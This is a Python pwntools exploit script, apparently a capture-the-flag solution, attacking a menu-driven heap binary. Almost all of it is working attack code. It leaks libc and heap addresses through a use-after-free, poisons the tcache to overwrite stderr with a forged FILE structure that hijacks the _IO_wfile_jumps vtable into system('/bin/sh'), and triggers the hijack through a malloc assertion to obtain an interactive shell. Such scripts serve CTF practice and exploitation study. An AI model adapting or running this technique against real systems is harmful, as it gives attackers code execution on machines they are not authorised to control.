#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "host"
exe = context.binary = ELF('./pwn5_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	brva 0x00000000000013F1
            brva 0x00000000000015FC
            brva 0x000000000000167D
            brva 0x00000000000014C5
        	b* __malloc_assert
        	b* fflush
        	b* _IO_wfile_sync
        	b* _IO_file_sync
        	b* __vfwprintf_internal+309
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
	p.sendlineafter(b'>> ', str(1))
	p.sendlineafter(b'number : ', str(idx))
	p.sendlineafter(b'(bytes) : ', str(size))
	p.sendafter(b'information : ', data)

def show(idx):
	p.sendlineafter(b'>> ', str(2))
	p.sendlineafter(b'number : ', str(idx))

def free(idx):
	p.sendlineafter(b'>> ', str(3))
	p.sendlineafter(b'number : ', str(idx))

# VARIABLE

# PAYLOAD
add(0, 0x420)
add(1, 0x420)
add(3, 0x100)
add(4, 0x100)
add(5, 0x100)
free(1)
show(1)
p.recvuntil(b'slot [1]:\n')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x21ace0
log.info("Libc base: " + hex(libc.address))
io_cookie_jumps = libc.address + 0x216b80 # _IO_cookie_jumps
stderr = libc.sym._IO_2_1_stderr_
io_wfile_jumps = libc.sym._IO_wfile_jumps
io_file_jumps = libc.sym._IO_file_jumps
system = libc.sym.system

free(0)
payload = flat(
	b'\0'*0x428, 0x111,
	)
add(2, 0x500, payload)
free(3)
show(3)
p.recvuntil(b'slot [3]:\n')
heap_base = u64(p.recv(5) + b'\0'*3) << 12
log.info("Heap base: " + hex(heap_base))

free(1)
free(2)
target = p64(stderr ^ ((heap_base + 0x6d0) >> 12))
payload = flat(
	b'\0'*0x428, 0x111,
	target
	)
add(2, 0x500, payload)
add(6, 0x100)
payload = b'  /bin/sh\0' # flag
payload += p64(1) + p64(0)
payload = payload.ljust(0x20, b'a')
payload += p64(1) + p64(0) # _IO_write_base  _IO_write_ptr
payload = payload.ljust(0x88, b'a') + p64(heap_base) # _lock
payload = payload.ljust(0xa0, b'a') + p64(heap_base + 0x2a0) # _wide_data
payload = payload.ljust(0xc0, b'a') + p64(0) # _mode
payload = payload.ljust(0xd8, b'a') + p64(io_wfile_jumps - 0x48 + 0x28) # vtable
add(7, 0x100, payload)

free(0)
free(4)
free(1)
target = (heap_base + 0xe20) ^ ((heap_base + 0x6d0) >> 12) # top_chunk
payload = b''
payload = payload.ljust(0x18, b'a') + p64(0) # _IO_write_base
payload = payload.ljust(0x30, b'a')
payload += p64(0) # _IO_buf_base
payload = payload.ljust(0xe0, b'a')
payload += p64(heap_base + 0x2a0 + 0x100) # _wide_vtable
payload = payload.ljust(0x100, b'a')
payload = payload.ljust(0x168, b'a') + p64(system)
payload = payload.ljust(0x428, b'a') + p64(0x110) + p64(target)
add(0, 0x500, payload)
add(8, 0x100)
add(9, 0x100, b'\0'*8 + p64(0x120))

# GDB()
p.sendlineafter(b'>> ', str(1))
p.sendlineafter(b'number : ', str(10))
p.sendlineafter(b'(bytes) : ', str(0x350)) # unsorted: 0x351

p.interactive()